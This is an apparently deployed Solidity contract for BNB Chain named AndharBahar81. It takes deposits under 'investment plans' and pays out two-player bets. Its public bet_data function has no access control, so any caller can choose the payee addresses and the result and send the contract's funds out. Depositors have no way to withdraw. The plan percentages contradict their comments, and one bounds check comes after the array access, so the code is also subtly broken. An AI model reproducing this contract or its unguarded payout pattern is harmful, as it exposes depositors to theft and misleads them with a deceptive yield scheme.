/**
 *Submitted for verification at BscScan.com on 2022-02-22
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-08
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-08
*/

pragma solidity 0.5.10;

contract AndharBahar81{
	using SafeMath for uint256;
    uint256 public betCount = 0;
	uint256[] public INVEST_MIN_AMOUNT = [0.001 ether,0.002 ether,0.005 ether];
    uint256[] public INVEST_MAX_AMOUNT = [0.001 ether,0.002 ether,0.005 ether];
		
	uint256  public CEO_FEE = 80;
	uint256  public ADMIN_FEE = 20;
	uint256 constant public PERCENTS_DIVIDER = 100;
	uint256 constant public TIME_STEP = 1 days;
	uint256 public totalInvested;
	//address payable Winner;
    
    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 withdrawn;
	}

	mapping (address => User) internal users;

    struct BetDeposit{
		address plan;
		uint256 amount;	
		uint256 start;	
	}

	struct BetUser{
		BetDeposit[] betdeposits;

	}

	mapping (address => BetUser) internal betusers;

	event BetNewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time); 


	uint256 public startDate;

	address payable public ceoWallet;
	address payable public adminWallet;
    	
	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable ceoAddr,address payable walletadmin, uint256 start) public {
		require(!isContract(ceoAddr));
		
		ceoWallet = ceoAddr;        
		adminWallet=walletadmin;

		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}

        plans.push(Plan(1,  1020)); // 102%
        plans.push(Plan(1,  1030)); // 103%
        plans.push(Plan(1,  1030)); // 104%

	}
mapping(uint => betdata) public betRecords;

struct betdata{
    uint bet_id;
	uint256 bet_amount;
    address player1_address;
    string player1_coin_side;
    address player2_address;
    string player2_coin_side;
    string result;
	uint256 admin_amount;
	uint256 winner_amount;
}    

    function invest(uint8 plan) public payable {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(msg.value >= INVEST_MIN_AMOUNT[plan],"invalid min amount");
		require(msg.value <= INVEST_MAX_AMOUNT[plan],"invalid max amount");
        require(plan < 4, "Invalid plan");
			
		User storage user = users[msg.sender];
		
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}        
       
		user.deposits.push(Deposit(plan, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value, block.timestamp);
	}

    function bet_data(uint8 plan_id, address payable player1_address, string memory player1_coin_side, address payable player2_address, string memory player2_coin_side, string memory result) public {
        betCount += 1;
	   uint256 bet_amount =  INVEST_MIN_AMOUNT[plan_id];
		uint256 admin_amount;
		uint256 winner_amount;


        BetUser storage betuser = betusers[player1_address];    
		BetUser storage betuser2 = betusers[player2_address];       
	

		betuser.betdeposits.push(BetDeposit(player1_address, bet_amount, block.timestamp));
		betuser2.betdeposits.push(BetDeposit(player2_address, bet_amount, block.timestamp));

  

		emit BetNewDeposit(player1_address, plan_id, bet_amount, block.timestamp);
		emit BetNewDeposit(player2_address, plan_id, bet_amount, block.timestamp);  
		
        admin_amount = (bet_amount * 2 * 10/100) ;
		winner_amount =  (bet_amount * 2 * 90/100);
		adminWallet.transfer(admin_amount);
		if(keccak256(abi.encodePacked(player1_coin_side))  == keccak256(abi.encodePacked(result))){
			player1_address.transfer(winner_amount);
            //ceoWallet.transfer(winner_amount);
		}else{
            player2_address.transfer(winner_amount);
            //adminWallet.transfer(winner_amount);
		}

        betRecords[betCount]= betdata(betCount, bet_amount, player1_address, player1_coin_side, player2_address , player2_coin_side, result, admin_amount, winner_amount);
	   
    }

    function walletBalance(address userAddress)public view returns (uint256 amount){
		uint256 totalwallet_balance  = getUserTotalDeposits(userAddress) - getUserBetPlayAmount(userAddress);
		return totalwallet_balance;
	}

	function getUserBetPlayAmount(address userAddress) public view returns (uint256 amount) {
		for (uint256 i = 0; i < betusers[userAddress].betdeposits.length; i++) {          
            amount = amount.add(betusers[userAddress].betdeposits[i].amount);
		}
	} 

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}


	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _contractBalance) {
		return(totalInvested, getContractBalance());
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}